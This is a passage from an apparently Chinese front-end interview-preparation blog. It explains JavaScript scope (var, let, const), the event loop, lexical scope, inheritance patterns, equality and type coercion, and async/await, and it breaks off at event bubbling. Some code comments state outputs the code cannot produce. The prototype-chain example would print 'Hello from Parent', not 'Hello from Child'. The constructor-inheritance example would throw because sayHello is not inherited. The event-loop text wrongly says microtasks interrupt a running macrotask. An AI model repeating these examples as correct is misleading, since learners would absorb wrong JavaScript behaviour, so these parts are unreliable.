class="hljs-comment">// 报错，x 不可见</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(y); <span class="hljs-comment">// 报错，y 不可见</span><br></code></pre></td></tr></table></figure><ol start="2"><li><strong><code>let</code> 的作用域：</strong><ul><li><code>let</code> 声明的变量具有块级作用域（block scope）。这意味着它们在包含它们的块（如 <code>&#123;&#125;</code>）内可见，但在块外不可见。</li><li>在同一个函数内的不同块中，可以使用不同的 <code>let</code> 声明同名的变量。</li></ul></li></ol><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">example</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">let</span> x = <span class="hljs-number">10</span>;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-literal">true</span>) &#123;<br>        <span class="hljs-keyword">let</span> y = <span class="hljs-number">20</span>;<br>    &#125;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(x); <span class="hljs-comment">// 10</span><br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(y); <span class="hljs-comment">// 报错，y 不可见</span><br>&#125;<br></code></pre></td></tr></table></figure><ol start="3"><li><strong><code>const</code> 的作用域：</strong><ul><li><code>const</code> 声明的变量也具有块级作用域，并且具有与 <code>let</code> 相同的作用域规则。</li><li>与 <code>let</code> 不同的是，<code>const</code> 声明的变量必须立即初始化，并且不能再次赋值。</li></ul></li></ol><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">example</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">const</span> x = <span class="hljs-number">10</span>;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-literal">true</span>) &#123;<br>        <span class="hljs-keyword">const</span> y = <span class="hljs-number">20</span>;<br>    &#125;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(x); <span class="hljs-comment">// 10</span><br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(y); <span class="hljs-comment">// 报错，y 不可见</span><br>&#125;<br></code></pre></td></tr></table></figure><p>总结：</p><ul><li>使用 <code>var</code> 声明的变量具有函数作用域，对整个函数可见。</li><li>使用 <code>let</code> 和 <code>const</code> 声明的变量具有块级作用域，对包含它们的块可见。</li><li><code>const</code> 声明的变量必须初始化，并且不能再次赋值。</li></ul><h3 id="18、事件循环"><a href="#18、事件循环" class="headerlink" title="18、事件循环"></a>18、事件循环</h3><p>事件循环（Event Loop）是前端开发中非常重要的概念之一，它是JavaScript执行和处理异步事件的核心机制之一。事件循环使得JavaScript能够处理用户交互、网络请求、定时器等异步任务，而不会阻塞主线程的执行。</p><p>以下是对事件循环的基本了解：</p><ol><li><p><strong>单线程执行模型：</strong> JavaScript是单线程语言，意味着它在任何给定时刻只能执行一个任务。这个任务通常是执行JavaScript代码，也就是主线程。但JavaScript通常会涉及到一些需要等待的异步操作，如网络请求、定时器、用户输入等，这时就需要事件循环来协调这些异步任务。</p></li><li><p><strong>任务队列：</strong> 事件循环通过任务队列来管理异步任务。任务队列分为两种：宏任务队列（macrotask queue）和微任务队列（microtask queue）。</p><ul><li>宏任务队列包括主线程执行的任务（例如执行JavaScript代码、处理DOM事件、定时器等），每个宏任务之间会有一个明确的间隔。</li><li>微任务队列用于保存需要尽快执行的任务，例如Promise的回调、<code>MutationObserver</code>的回调等。微任务会在当前宏任务执行完毕后立即执行。</li></ul></li><li><p><strong>事件循环过程：</strong> 事件循环是一个循环迭代的过程，它会不断地从宏任务队列中取出一个宏任务执行，然后检查并执行微任务队列中的所有微任务，然后进入下一个宏任务。这个过程不断重复，直到所有任务都被处理完毕。</p><p>具体步骤如下：</p><ul><li>从宏任务队列中取出一个宏任务。</li><li>执行宏任务，包括执行JavaScript代码、处理事件等。</li><li>检查微任务队列，执行所有微任务。</li><li>返回到第一步，继续下一个宏任务。</li></ul></li><li><p><strong>任务的优先级：</strong> 微任务队列的任务优先级高于宏任务队列，即使宏任务队列中有任务正在执行，也会立即执行微任务队列中的任务。</p></li><li><p><strong>阻塞主线程的问题：</strong> 由于JavaScript是单线程的，如果某个任务需要很长时间才能完成，它会阻塞主线程的执行，导致界面卡顿。因此，长时间运行的任务通常会被拆分成多个小任务，通过定时器或<code>requestAnimationFrame</code>等机制来实现异步执行，以避免阻塞。</p></li></ol><p>总之，事件循环是JavaScript处理异步任务的关键机制，它确保了JavaScript可以高效地处理各种异步操作，同时保持主线程的响应性。了解事件循环的原理有助于开发者更好地理解和处理异步编程中的各种场景。</p><p>JavaScript代码的执行过程中，除了依靠函数调用栈来搞定函数的执行顺序外，还依靠任务队列(task queue)来搞定另外一些代码的执行。整个执行过程，我们称为事件循环过程。一个线程中，事件循环是唯一的，但是任务队列可以拥有多个。任务队列又分为macro-task（宏任务）与micro-task（微任务），在最新标准中，它们被分别称为task与jobs。</p><p>macro-task大概包括：</p><ul><li>script(整体代码)</li><li>setTimeout</li><li>setInterval</li><li>setImmediate</li><li>I&#x2F;O</li><li>UI render</li></ul><p>micro-task大概包括:</p><ul><li>process.nextTick</li><li>Promise</li><li>Async&#x2F;Await(实际就是promise)</li><li>MutationObserver(html5新特性)</li></ul><p>整体执行：</p><img src="https://cdn.jsdelivr.net/gh/Yoonalis/img@master/blog/image-20230902184418128-20230902%2018:44:22.png" alt="image-20230902184418128" style="zoom:50%;" /><p>总的结论就是，执行宏任务，然后执行该宏任务产生的微任务，若微任务在执行过程中产生了新的微任务，则继续执行微任务，微任务执行完毕后，再回到宏任务中进行下一轮循环。</p><h5 id="事件循环例题"><a href="#事件循环例题" class="headerlink" title="事件循环例题"></a>事件循环例题</h5><p><img src="https://cdn.jsdelivr.net/gh/Yoonalis/img@master/blog/Snipaste_2023-07-23_15-47-35-20230902%2018:36:29.png" alt="Snipaste_2023-07-23_15-47-35"></p><p><a href="https://zhuanlan.zhihu.com/p/364698187">https://zhuanlan.zhihu.com/p/364698187</a></p><h3 id="19、词法作用域"><a href="#19、词法作用域" class="headerlink" title="19、词法作用域"></a>19、词法作用域</h3><p>词法作用域（Lexical Scope），也被称为静态作用域，是一种用于确定变量和标识符在代码中查找的规则。词法作用域是在代码编写时确定的，与代码的运行过程无关，因此也被称为静态作用域。这个作用域规则是由代码的结构和嵌套关系决定的，而不是由函数或代码块的执行顺序决定的。</p><p>以下是词法作用域的主要特点和原理：</p><ol><li><p><strong>作用域嵌套：</strong> 在词法作用域中，函数和代码块可以嵌套在其他函数或代码块内部，形成一个层级结构。内部作用域可以访问外部作用域的变量，但外部作用域不能访问内部作用域的变量。</p></li><li><p><strong>作用域链：</strong> 当在内部作用域中查找变量或标识符时，JavaScript会按照作用域链的顺序从内到外依次查找，直到找到匹配的标识符或到达全局作用域。这个作用域链是根据代码中的嵌套关系建立的。</p></li><li><p><strong>全局作用域：</strong> 最外层的作用域被称为全局作用域，它包含了整个JavaScript环境中的变量和函数。全局作用域中定义的变量和函数在任何地方都可以访问。</p></li><li><p><strong>局部作用域：</strong> 在函数内部或代码块内部定义的变量和函数只在其所在的局部作用域中可见，不能在外部作用域中直接访问。</p></li></ol><p>示例代码：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> globalVar = <span class="hljs-string">&quot;I am global&quot;</span>; <span class="hljs-comment">// 全局作用域</span><br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">outer</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">var</span> outerVar = <span class="hljs-string">&quot;I am outer&quot;</span>; <span class="hljs-comment">// outer函数的局部作用域</span><br>  <br>  <span class="hljs-keyword">function</span> <span class="hljs-title function_">inner</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">var</span> innerVar = <span class="hljs-string">&quot;I am inner&quot;</span>; <span class="hljs-comment">// inner函数的局部作用域</span><br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(innerVar); <span class="hljs-comment">// 可以访问innerVar</span><br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(outerVar); <span class="hljs-comment">// 可以访问outerVar</span><br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(globalVar); <span class="hljs-comment">// 可以访问globalVar</span><br>  &#125;<br><br>  <span class="hljs-title function_">inner</span>();<br>&#125;<br><br><span class="hljs-title function_">outer</span>();<br></code></pre></td></tr></table></figure><p>在上面的示例中，<code>inner</code> 函数可以访问其外部作用域（<code>outer</code> 函数和全局作用域）中的变量，但全局作用域不能访问 <code>inner</code> 函数的局部变量。</p><p>词法作用域的静态特性使得在编写和理解代码时能够更容易地确定变量的作用域和访问规则，有助于代码的可读性和可维护性。这与动态作用域不同，动态作用域是在运行时根据调用堆栈来确定变量的作用域。JavaScript采用的是词法作用域机制。</p><h3 id="20、你对继承有什么了解吗？有几种方式？优劣？"><a href="#20、你对继承有什么了解吗？有几种方式？优劣？" class="headerlink" title="20、你对继承有什么了解吗？有几种方式？优劣？"></a>20、你对继承有什么了解吗？有几种方式？优劣？</h3><p>继承是面向对象编程中的重要概念，用于描述对象之间的关系和属性共享。JavaScript支持多种方式来实现继承，每种方式都有其优势和劣势。以下是对继承的一些了解以及常见的继承方式：</p><h5 id="了解继承的概念"><a href="#了解继承的概念" class="headerlink" title="了解继承的概念"></a>了解继承的概念</h5><p>继承是一种机制，通过它一个对象（子类或派生类）可以获取另一个对象（父类或基类）的属性和方法。继承允许代码重用，减少了冗余，提高了可维护性。在继承关系中，父类通常包含通用的属性和方法，而子类可以继承这些属性和方法，并可以添加自己的特定属性和方法。</p><h5 id="常见的继承方式"><a href="#常见的继承方式" class="headerlink" title="常见的继承方式"></a>常见的继承方式</h5><ol><li><p><strong>原型链继承</strong>：</p><ul><li><strong>优势：</strong> 简单，易于理解和实现。</li><li><strong>劣势：</strong> 无法传递参数给父类构造函数，子类共享父类实例属性，容易产生属性污染。</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Parent</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = <span class="hljs-string">&#x27;Parent&#x27;</span>;<br>&#125;<br><br><span class="hljs-title class_">Parent</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">sayHello</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;Hello from &#x27;</span> + <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span>);<br>&#125;;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">Child</span>(<span class="hljs-params"></span>) &#123;&#125;<br><span class="hljs-title class_">Child</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Parent</span>();<br><br><span class="hljs-keyword">var</span> child = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Child</span>();<br>child.<span class="hljs-title function_">sayHello</span>(); <span class="hljs-comment">// 输出 &quot;Hello from Child&quot;</span><br></code></pre></td></tr></table></figure></li><li><p><strong>构造函数继承</strong>：</p><ul><li><strong>优势：</strong> 可以传递参数给父类构造函数，避免属性污染。</li><li><strong>劣势：</strong> 无法继承父类原型上的方法。</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Parent</span>(<span class="hljs-params">name</span>) &#123;<br>  <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name || <span class="hljs-string">&#x27;Parent&#x27;</span>;<br>&#125;<br><br><span class="hljs-title class_">Parent</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">sayHello</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;Hello from &#x27;</span> + <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span>);<br>&#125;;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">Child</span>(<span class="hljs-params">name</span>) &#123;<br>  <span class="hljs-title class_">Parent</span>.<span class="hljs-title function_">call</span>(<span class="hljs-variable language_">this</span>, name);<br>&#125;<br><br><span class="hljs-keyword">var</span> child = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Child</span>(<span class="hljs-string">&#x27;Child&#x27;</span>);<br>child.<span class="hljs-title function_">sayHello</span>(); <span class="hljs-comment">// 输出 &quot;Hello from Child&quot;</span><br></code></pre></td></tr></table></figure></li><li><p><strong>组合继承</strong>（原型链继承和构造函数继承的组合）：</p><ul><li><strong>优势：</strong> 继承父类的属性和方法，避免属性污染，可以传递参数给父类构造函数。</li><li><strong>劣势：</strong> 调用了两次父类构造函数，导致性能开销较大。</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Parent</span>(<span class="hljs-params">name</span>) &#123;<br>  <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name || <span class="hljs-string">&#x27;Parent&#x27;</span>;<br>&#125;<br><br><span class="hljs-title class_">Parent</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">sayHello</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;Hello from &#x27;</span> + <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span>);<br>&#125;;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">Child</span>(<span class="hljs-params">name</span>) &#123;<br>  <span class="hljs-title class_">Parent</span>.<span class="hljs-title function_">call</span>(<span class="hljs-variable language_">this</span>, name);<br>&#125;<br><br><span class="hljs-title class_">Child</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Parent</span>();<br><br><span class="hljs-keyword">var</span> child = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Child</span>(<span class="hljs-string">&#x27;Child&#x27;</span>);<br>child.<span class="hljs-title function_">sayHello</span>(); <span class="hljs-comment">// 输出 &quot;Hello from Child&quot;</span><br></code></pre></td></tr></table></figure></li><li><p><strong>ES6类继承</strong>：</p><ul><li><strong>优势：</strong> 基于类和继承关键字，语法更清晰，可读性更高。</li><li><strong>劣势：</strong> 不支持多继承。</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Parent</span> &#123;<br>  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">name</span>) &#123;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name || <span class="hljs-string">&#x27;Parent&#x27;</span>;<br>  &#125;<br><br>  <span class="hljs-title function_">sayHello</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;Hello from &#x27;</span> + <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span>);<br>  &#125;<br>&#125;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Child</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_ inherited__">Parent</span> &#123;<br>  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">name</span>) &#123;<br>    <span class="hljs-variable language_">super</span>(name);<br>  &#125;<br>&#125;<br><br><span class="hljs-keyword">const</span> child = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Child</span>(<span class="hljs-string">&#x27;Child&#x27;</span>);<br>child.<span class="hljs-title function_">sayHello</span>(); <span class="hljs-comment">// 输出 &quot;Hello from Child&quot;</span><br></code></pre></td></tr></table></figure></li></ol><h5 id="选择继承方式的考虑因素"><a href="#选择继承方式的考虑因素" class="headerlink" title="选择继承方式的考虑因素"></a>选择继承方式的考虑因素</h5><p>选择合适的继承方式取决于具体的需求和场景：</p><ul><li>如果你需要简单的继承关系，并且不需要传递参数给父类构造函数，原型链继承是一个简单的选择。</li><li>如果需要传递参数给父类构造函数，构造函数继承或组合继承是合适的。</li><li>如果你在一个支持ES6的环境中工作，类继承提供了一种更现代和清晰的方式来实现继承。</li></ul><p>需要根据具体的需求和项目来选择合适的继承方式，并权衡每种方式的优劣。在实际开发中，也可以根据情况采用不同的继承方式来组合使用。</p><h3 id="21、js的比较"><a href="#21、js的比较" class="headerlink" title="21、js的比较"></a>21、js的比较</h3><h5 id="JS中常用的比较两个值相等的方式"><a href="#JS中常用的比较两个值相等的方式" class="headerlink" title="JS中常用的比较两个值相等的方式"></a>JS中常用的比较两个值相等的方式</h5><p>在 JavaScript 中，比较两个值是否相等有多种方式，每种方式都有其适用的场景。以下是一些常用的比较方式：</p><ol><li><p><strong>严格相等（Strict Equality）：</strong></p><ul><li>使用 <code>===</code> 运算符来比较两个值是否在相等值和相等类型上都相同。如果两个值的类型和值都相同，返回 <code>true</code>，否则返回 <code>false</code>。</li><li>例如：<code>5 === 5</code> 返回 <code>true</code>，<code>&#39;hello&#39; === &#39;world&#39;</code> 返回 <code>false</code>。</li></ul></li><li><p><strong>松散相等（Loose Equality）：</strong></p><ul><li>使用 <code>==</code> 运算符来比较两个值是否在相等值上相同。它会进行类型转换，将值转换为相同类型后再比较。如果值相等，返回 <code>true</code>，否则返回 <code>false</code>。</li><li>例如：<code>5 == &#39;5&#39;</code> 返回 <code>true</code>，<code>null == undefined</code> 返回 <code>true</code>。</li></ul></li><li><p><strong>Object.is() 方法：</strong></p><ul><li>使用 <code>Object.is()</code> 方法比较两个值是否在相等值和相等类型上都相同，类似于严格相等（<code>===</code>）。但它有一些特殊的行为，例如对待 <code>NaN</code> 和 <code>-0</code> 不同。</li><li>例如：<code>Object.is(5, 5)</code> 返回 <code>true</code>，<code>Object.is(NaN, NaN)</code> 返回 <code>true</code>。</li></ul></li><li><p><strong>浅比较对象（Shallow Object Comparison）：</strong></p><ul><li>对于对象（包括数组），可以使用 <code>===</code> 或 <code>Object.is()</code> 来比较它们的引用是否相同。这是浅比较，不会递归比较对象的属性。</li><li>例如：<code>&#123;&#125; === &#123;&#125;</code> 返回 <code>false</code>，<code>[1, 2, 3] === [1, 2, 3]</code> 返回 <code>false</code>。</li></ul></li><li><p><strong>深比较对象（Deep Object Comparison）：</strong></p><ul><li>对于深度比较对象，通常需要自定义函数或使用第三方库来递归比较对象的属性。常见的库包括 lodash 的 <code>_.isEqual()</code> 方法。</li></ul></li><li><p><strong>三元运算符（Ternary Operator）：</strong></p><ul><li>使用三元运算符 <code>condition ? valueIfTrue : valueIfFalse</code> 来根据条件返回不同的值，这也可以用于比较两个值。</li><li>例如：<code>5 &gt; 3 ? &#39;greater&#39; : &#39;less&#39;</code> 返回 <code>&#39;greater&#39;</code>。</li></ul></li></ol><p>选择哪种比较方式取决于你的需求和比较的对象类型。对于简单的值比较，严格相等运算符 <code>===</code> 是首选，因为它不会进行类型转换。但在某些情况下，需要考虑类型转换的影响，可以使用松散相等运算符 <code>==</code> 或 <code>Object.is()</code>。对于对象比较，需要根据深浅比较的需求选择合适的方式。</p><h5 id="x3D-x3D-0-输出啥"><a href="#x3D-x3D-0-输出啥" class="headerlink" title="([]&#x3D;&#x3D;0)输出啥"></a>([]&#x3D;&#x3D;0)输出啥</h5><p><code>([] == 0)</code> 的结果是 <code>true</code>。</p><p>这可能会令人感到惊讶，但它是 JavaScript 中的一种类型转换规则。在这个比较中，左侧的 <code>[]</code> 是一个空数组，右侧的 <code>0</code> 是一个数字。</p><p>在 JavaScript 中，当进行 <code>==</code> 松散相等比较时，如果操作数的类型不同，JavaScript 会尝试将它们转换为共同的类型，然后再进行比较。在这个情况下，空数组 <code>[]</code> 被转换成了数字，具体的转换步骤如下：</p><ol><li>JavaScript 尝试将左侧的空数组 <code>[]</code> 转换成数字。</li><li>空数组在进行类型转换时会被视为 0。</li><li>因此，比较变成了 <code>0 == 0</code>。</li><li>最终结果是 <code>true</code>，因为 <code>0</code> 等于 <code>0</code>。</li></ol><p>这种类型转换规则使得 <code>([] == 0)</code> 返回 <code>true</code>，但通常建议使用严格相等运算符 <code>===</code> 来避免这种类型转换带来的意外结果，因为 <code>===</code> 不会进行类型转换，只有在值和类型都相同时才返回 <code>true</code>。</p><h5 id="x3D-x3D-怎么进行类型转换"><a href="#x3D-x3D-怎么进行类型转换" class="headerlink" title="&#x3D;&#x3D;怎么进行类型转换"></a>&#x3D;&#x3D;怎么进行类型转换</h5><p>在 JavaScript 中，<code>==</code> 运算符进行类型转换的过程如下：</p><ol><li><p>**如果两个操作数的类型相同（严格相等），则直接返回比较结果，不进行类型转换。例如，<code>5 == 5</code> 返回 <code>true</code>。</p></li><li><p>**如果两个操作数的类型不同，JavaScript 会尝试将它们转换为相同的类型，然后再进行比较。</p><ul><li><p>如果一个操作数是字符串，另一个是数字，JavaScript 会尝试将字符串转换为数字，然后进行比较。例如，<code>&#39;5&#39; == 5</code> 返回 <code>true</code>，因为字符串 <code>&#39;5&#39;</code> 被转换成了数字 <code>5</code>。</p></li><li><p>如果一个操作数是对象，另一个是原始类型（数字、字符串、布尔等），JavaScript 会尝试调用对象的 <code>valueOf()</code> 方法，然后再进行比较。如果 <code>valueOf()</code> 返回的是原始类型值，就将其与另一个操作数进行比较。如果 <code>valueOf()</code> 返回的是对象本身，会继续尝试调用 <code>toString()</code> 方法，然后再比较。这个过程称为对象的类型转换。</p></li><li><p>如果一个操作数是 <code>null</code>，另一个是 <code>undefined</code>，它们会被认为相等，返回 <code>true</code>。</p></li><li><p>如果其中一个操作数是 <code>NaN</code>，比较结果通常是 <code>false</code>，因为 <code>NaN</code> 不等于任何值，包括它自己。</p></li><li><p>如果一个操作数是布尔值，另一个是非布尔值，布尔值会被转换成数字 <code>1</code>（如果为 <code>true</code>）或 <code>0</code>（如果为 <code>false</code>），然后进行比较。</p></li><li><p>如果一个操作数是 <code>undefined</code>，另一个是非 <code>null</code> 对象，它们会被认为不相等。</p></li></ul></li><li><p><strong>最终返回比较的结果。</strong></p></li></ol><p>这种类型转换规则使得 <code>==</code> 运算符比较灵活，但也容易导致一些意外的结果，因此在编写代码时，通常更推荐使用严格相等运算符 <code>===</code>，因为它不进行类型转换，只有在值和类型都相同时才返回 <code>true</code>。这有助于避免类型转换可能带来的不确定性。</p><h3 id="22、解释一下async-await的实现原理"><a href="#22、解释一下async-await的实现原理" class="headerlink" title="22、解释一下async await的实现原理"></a>22、解释一下async await的实现原理</h3><p><code>async/await</code> 是 JavaScript 中用于处理异步操作的一种语法糖，它使异步代码看起来更像同步代码，更容易理解和维护。<code>async/await</code> 的实现原理涉及到两个关键概念：Promise 和生成器（Generator）。</p><p>下面是 <code>async/await</code> 的基本原理：</p><ol><li><p><strong>Promise：</strong> <code>async</code> 函数内部的所有异步操作都被封装成了 Promise 对象。这意味着 <code>async</code> 函数中的异步操作会返回一个 Promise，可以使用 <code>then</code> 方法来处理异步操作的结果。</p></li><li><p><strong>生成器（Generator）：</strong> <code>async</code> 函数本质上是一种特殊的生成器函数。生成器是一种可以暂停和恢复执行的函数，它通过 <code>yield</code> 关键字来实现暂停，然后通过 <code>next</code> 方法来继续执行。</p></li><li><p><strong><code>await</code> 关键字：</strong> 在 <code>async</code> 函数中，<code>await</code> 关键字用于等待一个 Promise 对象的解决（或拒绝）并返回其结果。当遇到 <code>await</code> 关键字时，<code>async</code> 函数会暂停执行，让出线程，直到 Promise 对象状态变为解决或拒绝，并返回结果。这个过程是异步的，不会阻塞其他代码的执行。</p></li><li><p><strong><code>async</code> 函数的返回值：</strong> <code>async</code> 函数会返回一个 Promise 对象。如果 <code>async</code> 函数中的代码执行完毕并没有返回其他值，该 Promise 对象会自动解决为 <code>undefined</code>。</p></li></ol><p>下面是一个示例，演示了 <code>async/await</code> 的基本工作原理：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">fetchData</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">try</span> &#123;<br>    <span class="hljs-keyword">const</span> response = <span class="hljs-keyword">await</span> <span class="hljs-title function_">fetch</span>(<span class="hljs-string">&#x27;https://api.example.com/data&#x27;</span>);<br>    <span class="hljs-keyword">if</span> (!response.<span class="hljs-property">ok</span>) &#123;<br>      <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">&#x27;Fetch failed&#x27;</span>);<br>    &#125;<br>    <span class="hljs-keyword">const</span> data = <span class="hljs-keyword">await</span> response.<span class="hljs-title function_">json</span>();<br>    <span class="hljs-keyword">return</span> data;<br>  &#125; <span class="hljs-keyword">catch</span> (error) &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">&#x27;Error:&#x27;</span>, error);<br>    <span class="hljs-keyword">throw</span> error;<br>  &#125;<br>&#125;<br><br><span class="hljs-comment">// 使用 async 函数</span><br><span class="hljs-title function_">fetchData</span>()<br>  .<span class="hljs-title function_">then</span>(<span class="hljs-function">(<span class="hljs-params">data</span>) =&gt;</span> &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;Data:&#x27;</span>, data);<br>  &#125;)<br>  .<span class="hljs-title function_">catch</span>(<span class="hljs-function">(<span class="hljs-params">error</span>) =&gt;</span> &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">&#x27;Fetch error:&#x27;</span>, error);<br>  &#125;);<br></code></pre></td></tr></table></figure><p>在上述示例中，<code>async</code> 函数 <code>fetchData</code> 中的异步操作（<code>fetch</code> 和 <code>response.json()</code>）都返回 Promise 对象，并使用 <code>await</code> 关键字等待其解决。<code>fetchData</code> 函数返回一个 Promise，可以使用 <code>then</code> 和 <code>catch</code> 处理异步操作的结果和错误。</p><p>总结来说，<code>async/await</code> 的实现原理基于 Promise 和生成器，通过 <code>await</code> 关键字实现异步操作的等待和暂停，使代码看起来更加同步化，易于理解和编写。这提高了异步代码的可读性和可维护性。</p><h3 id="23、冒泡事件和捕获事件执行顺序"><a href="#23、冒泡事件和捕获事件执行顺序" class="headerlink" title="23、冒泡事件和捕获事件执行顺序"></a>23、冒泡事件和捕获事件执行顺序</h3><p>事件传播是指在 HTML 文档中，当一个事件（例如点击鼠标、按键盘键等）在 DOM 